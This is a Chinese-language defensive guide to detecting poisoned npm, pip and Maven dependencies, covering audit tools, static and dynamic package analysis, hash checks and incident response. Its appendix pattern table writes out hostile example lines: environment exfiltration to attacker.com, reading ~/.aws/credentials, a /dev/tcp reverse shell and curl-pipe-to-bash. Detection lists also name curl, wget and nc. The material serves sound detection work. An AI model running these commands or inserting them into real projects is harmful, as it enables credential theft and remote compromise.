# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供依赖投毒检测的系统化指南。通过本方法论，测试人员能够系统性地检测项目是否存在依赖投毒风险，识别被投毒的依赖包，并评估影响范围。

## 1.2 适用范围

本文档适用于以下场景：
- 企业项目依赖安全审计
- CI/CD 管道依赖安全检查
- 开源项目依赖安全审查
- 事件响应中的投毒检测
- 供应链安全评估

## 1.3 读者对象

本文档主要面向：
- 执行安全审计的安全工程师
- 负责依赖管理的开发人员
- DevSecOps 工程师
- 安全研究人员

---

# 第二部分：依赖投毒检测

## 专题一：依赖投毒检测

### 2.1 技术介绍

依赖投毒检测是识别项目依赖中是否存在恶意包或被篡改包的过程。依赖投毒可能通过多种方式发生，包括依赖混淆、Typosquatting、恶意更新等。

**检测目标：**
- 识别异常依赖包
- 检测被篡改的依赖
- 发现可疑的包行为
- 评估投毒影响范围

### 2.2 依赖投毒类型

#### 2.2.1 投毒类型分类

| 类型 | 描述 | 检测难度 |
|-----|------|---------|
| **依赖混淆** | 公共包名与内部包名冲突 | 中 |
| **Typosquatting** | 包名与流行包相似 | 低 |
| **恶意更新** | 合法包更新中植入恶意代码 | 高 |
| **传递依赖投毒** | 深层依赖被投毒 | 高 |
| **账户劫持** | 包维护者账户被盗 | 中 |
| **仓库投毒** | 包仓库被入侵 | 中 |

#### 2.2.2 常见恶意行为特征

| 行为 | 描述 | 检测信号 |
|-----|------|---------|
| **安装时执行** | postinstall 脚本执行恶意代码 | 异常网络请求 |
| **运行时执行** | 包被导入时执行恶意代码 | 异常系统调用 |
| **数据外带** | 收集环境信息发送到外部 | 异常出站连接 |
| **持久化** | 修改系统配置实现持久化 | 文件系统变更 |
| **横向移动** | 窃取凭证访问其他系统 | 凭证文件访问 |

### 2.3 检测方法

#### 2.3.1 依赖清单分析

**npm 项目检测：**

```bash
# 1. 生成依赖清单
npm list --depth=0 > dependencies.txt
npm ls --all > all-dependencies.txt

# 2. 检查可疑包名
# - 拼写错误的流行包
# - 与内部包同名的公共包
# - 未知来源的包

# 3. 检查包版本
# - 突然的大版本更新
# - 不寻常的版本号

# 4. 使用审计工具
npm audit
npm audit --json

# 5. 检查包元数据
npm view <package-name>
npm view <package-name> maintainers
npm view <package-name> time

# 6. 检查 postinstall 脚本
cat node_modules/<package>/package.json | grep -A 5 "scripts"
```

**pip 项目检测：**

```bash
# 1. 生成依赖清单
pip freeze > requirements.txt
pip list --outdated

# 2. 使用审计工具
pip audit
safety check

# 3. 检查包信息
pip show <package-name>
pip index versions <package-name>

# 4. 检查包内容
pip download <package-name>
unzip -l <package-name>*.whl
```

**Maven 项目检测：**

```bash
# 1. 生成依赖树
mvn dependency:tree > dependencies.txt

# 2. 使用审计工具
mvn org.owasp:dependency-check-maven:check

# 3. 检查依赖信息
mvn dependency:resolve -Dclassifier=sources
```

#### 2.3.2 包内容分析

**静态分析：**

```bash
# 1. 检查 package.json 脚本
cat node_modules/<package>/package.json | jq '.scripts'

# 可疑脚本特征
- postinstall 包含 curl/wget
- postinstall 包含 nc/ncat
- postinstall 包含 base64 解码
- postinstall 包含 eval

# 2. 检查 JavaScript 文件
grep -r "child_process" node_modules/<package>/
grep -r "exec" node_modules/<package>/
grep -r "eval" node_modules/<package>/
grep -r "http" node_modules/<package>/

# 3. 检查二进制文件
find node_modules/<package>/ -name "*.node"
file node_modules/<package>/**/*.node
```

**动态分析：**

```bash
# 1. 监控安装过程
strace -f npm install <package-name> 2>&1 | grep -E "connect|open|exec"

# 2. 监控网络请求
tcpdump -i any -n port 80 or port 443

# 3. 使用沙箱环境
# 在隔离环境中安装包并观察行为
```

#### 2.3.3 行为检测

**网络行为检测：**

```bash
# 1. 监控出站连接
netstat -an | grep ESTABLISHED
lsof -i -n -P

# 2. 检查 DNS 请求
tcpdump -i any port 53

# 3. 检查日志中的异常连接
grep -E "curl|wget|nc |ncat" /var/log/*
```

**文件系统行为检测：**

```bash
# 1. 检查文件修改
find /path/to/project -mtime -1 -type f

# 2. 检查可疑文件
find node_modules -name "*.sh" -o -name "*.bat"
find node_modules -name ".hook*" -o -name "*backdoor*"

# 3. 检查凭证文件访问
grep -r "credentials\|password\|secret\|token" node_modules/<package>/
```

#### 2.3.4 自动化工具检测

**依赖审计工具：**

```bash
# npm
npm audit
npx audit-ci
npm-audit-fix

# pip
pip audit
safety check
pipenv check

# 通用
snyk test
osv-scanner
dependency-check
```

**恶意包检测工具：**

```bash
# Suspicious Package-Scanner
git clone https://github.com/IGI-111/Suspicious-Package-Scanner.git
python scanner.py <package-name>

# Malware-Analysis
# 使用 VirusTotal API 检查包
curl -X POST https://www.virustotal.com/api/v3/files \
  -H "x-apikey: YOUR_API_KEY" \
  -F "file=@suspicious-package.tgz"
```

### 2.4 投毒确认方法

#### 2.4.1 包来源验证

```bash
# npm 包验证
# 1. 检查发布者
npm view <package-name> maintainers

# 2. 检查发布历史
npm view <package-name> time

# 3. 比较官方仓库
git clone https://github.com/official/repo.git
diff -r repo node_modules/<package>

# pip 包验证
# 1. 检查发布者
pip show <package-name>

# 2. 下载官方包比较
pip download <package-name>
```

#### 2.4.2 哈希比较

```bash
# 1. 获取官方包哈希
curl https://registry.npmjs.org/<package-name>/-/<package>-1.0.0.tgz | sha256sum

# 2. 计算本地包哈希
sha256sum node_modules/<package>/...

# 3. 比较哈希值
```

#### 2.4.3 代码审查

```bash
# 1. 审查可疑代码
cat node_modules/<package>/index.js

# 2. 查找恶意模式
grep -r "Buffer.from.*base64" node_modules/<package>/
grep -r "eval.*atob" node_modules/<package>/
grep -r "https?.*attacker" node_modules/<package>/

# 3. 检查混淆代码
# 高度混淆的代码可能是恶意的
```

### 2.5 响应和恢复

#### 2.5.1 立即响应

```bash
# 1. 隔离受影响系统
# 断开网络连接

# 2. 停止相关进程
ps aux | grep node
kill -9 <pid>

# 3. 移除恶意包
rm -rf node_modules/<malicious-package>
npm uninstall <malicious-package>

# 4. 更改泄露凭证
# 如果凭证可能泄露，立即更改
```

#### 2.5.2 影响评估

```bash
# 1. 确定影响范围
# - 哪些系统安装了恶意包
# - 安装了多长时间
# - 是否有数据泄露

# 2. 检查凭证泄露
# - 检查访问日志
# - 检查异常登录

# 3. 检查持久化
# - 检查启动项
# - 检查定时任务
```

#### 2.5.3 恢复步骤

```bash
# 1. 清理环境
rm -rf node_modules package-lock.json
npm cache clean --force

# 2. 重新安装依赖
# 使用已知安全的版本
npm install

# 3. 更新依赖
npm update

# 4. 加强监控
# 部署额外的监控措施
```

---

# 第三部分：附录

## 3.1 依赖投毒检测清单

- [ ] 已生成完整依赖清单
- [ ] 已运行安全审计工具
- [ ] 已检查 Typosquatting 包
- [ ] 已检查依赖混淆风险
- [ ] 已审查 postinstall 脚本
- [ ] 已检查可疑网络行为
- [ ] 已检查文件系统变更
- [ ] 已验证包来源
- [ ] 已比较哈希值
- [ ] 已审查可疑代码

## 3.2 常见恶意代码模式

| 模式 | 描述 | 示例 |
|-----|------|------|
| **安装时执行** | postinstall 脚本 | `"postinstall": "node exploit.js"` |
| **数据外带** | 发送环境信息 | `curl http://attacker.com/?env=$(env)` |
| **凭证窃取** | 读取凭证文件 | `cat ~/.aws/credentials` |
| **反向 Shell** | 建立反向连接 | `bash -i >& /dev/tcp/attacker/4444` |
| **下载执行** | 下载并执行恶意脚本 | `curl http://attacker.com/shell.sh\|bash` |
| **持久化** | 修改启动配置 | 添加到 crontab 或注册表 |

## 3.3 检测工具汇总

| 工具 | 用途 | 平台 |
|-----|------|------|
| **npm audit** | npm 安全审计 | npm |
| **pip audit** | pip 安全审计 | pip |
| **snyk** | 依赖漏洞扫描 | 通用 |
| **osv-scanner** | 漏洞扫描 | 通用 |
| **dependency-check** | 依赖安全检查 | Java |
| **safety** | Python 安全检查 | pip |
| **VirusTotal** | 恶意软件检测 | 通用 |

## 3.4 防御建议

1. **锁文件**：始终使用并提交锁文件
2. **版本固定**：固定所有依赖版本
3. **私有源**：配置私有源优先级
4. **定期审计**：定期运行安全审计
5. **最小权限**：限制包安装权限
6. **网络监控**：监控异常网络行为
7. **CI/CD 检查**：在 CI/CD 中集成安全检查
8. **事件响应**：制定依赖投毒响应计划
9. **安全培训**：对团队进行安全培训
10. **供应商管理**：评估依赖包维护者可信度
